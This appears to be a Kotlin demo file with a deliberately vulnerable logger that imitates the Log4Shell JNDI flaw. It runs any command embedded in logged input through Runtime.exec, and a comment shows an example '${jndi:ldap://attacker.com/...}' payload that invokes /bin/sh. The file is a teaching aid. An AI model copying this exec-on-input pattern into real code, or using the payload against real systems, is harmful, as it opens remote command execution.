package demo

/**
 * A deliberately vulnerable "log util" that mimics a Log4Shell-style JNDI lookup.
 */
object VulnerableLogger {
    fun log(input: String): String {
        if (input.startsWith("\${jndi:")) {
            // Simulates the CVE-2021-44228 gadget chain
            val command = extractCommand(input)
            Runtime.getRuntime().exec(command)  // The exploit
        }
        return "Logged: $input"
    }

    private fun extractCommand(input: String): Array<String> {
        // e.g. input = "${jndi:ldap://attacker.com/Exploit?cmd=/bin/sh,-c,echo pwned}"
        val cmdPart = input.substringAfter("cmd=").substringBefore("}")
        return cmdPart.split(",").toTypedArray()
    }
}
